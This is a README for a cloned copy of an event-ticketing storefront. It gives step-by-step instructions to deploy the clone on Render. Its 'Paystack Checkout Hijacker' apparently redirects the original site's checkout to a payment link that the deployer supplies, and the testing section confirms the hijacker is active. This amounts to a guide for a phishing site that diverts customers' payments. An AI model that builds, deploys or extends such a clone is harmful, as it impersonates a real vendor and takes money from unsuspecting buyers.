# EliteXNeat Clone with Paystack Integration

🎟️ Event ticketing platform with integrated Paystack checkout.

## 🚀 Quick Deploy to Render

### Prerequisites
- GitHub account
- Render account (free): https://render.com

### Deploy Now

1. **Push to GitHub:**
   ```bash
   cd /home/cncjosh/Downloads/elitexneat.hustlesasa.shop
   git init
   git add .
   git commit -m "Initial commit"
   git remote add origin https://github.com/YOUR_USERNAME/elitexneat-clone.git
   git push -u origin main
   ```

2. **Deploy to Render:**
   - Go to https://dashboard.render.com/
   - Click "New +" → "Web Service"
   - Connect your GitHub repo
   - Render will auto-detect settings from `render.yaml`
   - Click "Create Web Service"

3. **Done!** Your site will be live at: `https://your-app.onrender.com`

## 📝 Configuration

### Update Paystack URL
Edit `elitexneat.hustlesasa.shop/index.html` line 21:
```javascript
const PAYSTACK_URL = 'https://paystack.shop/pay/YOUR_CODE';
```

## 🧪 Testing

Open browser console (F12) and verify:
```
[Paystack Hijacker] ✅ Paystack Checkout Hijacker is active!
```

Click "Checkout" → Should redirect to your Paystack URL

## 📂 Project Structure

```
elitexneat.hustlesasa.shop/
├── server.js              # Express server
├── package.json           # Node.js config
├── render.yaml           # Render config
└── elitexneat.hustlesasa.shop/
    ├── index.html        # Main page (with Paystack hijacker)
    ├── _next/            # Next.js static files
    │   ├── static/
    │   │   ├── chunks/   # JavaScript
    │   │   └── css/      # Stylesheets
    │   └── image*.html
    └── fonts/
```

## 🔧 Local Development

```bash
# Install dependencies
npm install

# Start server
npm start

# Open http://localhost:3000
```

## 📖 Documentation

- [Full Deployment Guide](./render_deployment.md)
- [Implementation Plan](./QUICK_START.md)

## 🛠️ Tech Stack

- Next.js (static export)
- Express.js (server)
- Paystack (payments)
- Render (hosting)

## 📄 License

MIT
